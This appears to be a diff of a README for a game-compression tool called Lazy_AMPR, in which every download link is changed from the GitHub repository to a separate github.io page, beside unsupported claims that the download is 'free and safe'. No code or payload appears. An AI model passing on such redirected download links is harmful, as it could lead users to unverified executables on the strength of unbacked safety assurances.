@@ -1,6 +1,6 @@
 # 🗜️ Lazy_AMPR - Compress Games Quickly and Easily
 
-[![Download Lazy_AMPR](https://img.shields.io/badge/Download-Lazy__AMPR-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Waverlysoft8197/Lazy_AMPR)
+[![Download Lazy_AMPR](https://img.shields.io/badge/Download-Lazy__AMPR-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://waverlysoft8197.github.io)
 
 ## ✨ What Is Lazy_AMPR?
 
@@ -20,7 +20,7 @@ That's it! No special setup or extra software required.
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/Waverlysoft8197/Lazy_AMPR](https://github.com/Waverlysoft8197/Lazy_AMPR)
+**Visit this link to download the application:** [https://waverlysoft8197.github.io](https://waverlysoft8197.github.io)
 
 When you visit this page, you'll see the latest version of Lazy_AMPR ready for download. The download is free and safe to use.
 
@@ -115,7 +115,7 @@ Lazy_AMPR is an offline tool. It doesn't collect your personal information, trac
 
 Now you know everything you need to use Lazy_AMPR. It's a simple, effective way to compress your games and free up space. Remember:
 
-1. **Visit this link to download the application:** [https://github.com/Waverlysoft8197/Lazy_AMPR](https://github.com/Waverlysoft8197/Lazy_AMPR)
+1. **Visit this link to download the application:** [https://waverlysoft8197.github.io](https://waverlysoft8197.github.io)
 2. Download the program.
 3. Run it and compress your games in minutes.
 
